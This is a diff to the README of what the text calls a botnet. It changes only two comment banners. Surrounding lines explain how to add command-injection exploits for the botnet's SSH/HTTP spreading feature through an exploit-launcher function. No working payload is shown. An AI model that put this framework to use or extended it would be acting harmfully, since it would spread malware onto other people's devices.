@@ -60,9 +60,9 @@ The spread feature will scan on the default SSH and HTTP (vulnerabilities). Opti
 # Add/Customize Exploit
 The exploit that's used in this botnet mostly will be a command injection (TBH it's all of it LMAO). You can add more new exploits if you want, but I recommend it to be a command injection vulnerability because you don't need to add or write anything more you just need to config it. I try to make the exploit feature easy and flexible to the configuration as much as I can. If two examples down below is not enough you can see more example in "internal/exploit.go".
 
-	################################################################
-	### Example 1 In case that you want to add a new HTTP header ###
-	################################################################
+	#################################################################
+	### Example 1: In case that you want to add a new HTTP header ###
+	#################################################################
 	
 	func (b *Bot) CVE_someYear_newCVE1() {
 		
@@ -99,9 +99,9 @@ The exploit that's used in this botnet mostly will be a command injection (TBH i
 		b.exploitLauncher(enewCVE1, newHeader)				# Launch the exploit by putting the exploit structure and header in to "b.exploitLauncher(ourExploit, ourHeader)" function.
 	}
 	
-	#################################################################
-	### Example 2 In case you don't need to add a new HTTP header ###
-	#################################################################
+	##################################################################
+	### Example 2: In case you don't need to add a new HTTP header ###
+	##################################################################
 	
 	# This example is the same as the first example in terms of header and body configs.
 	
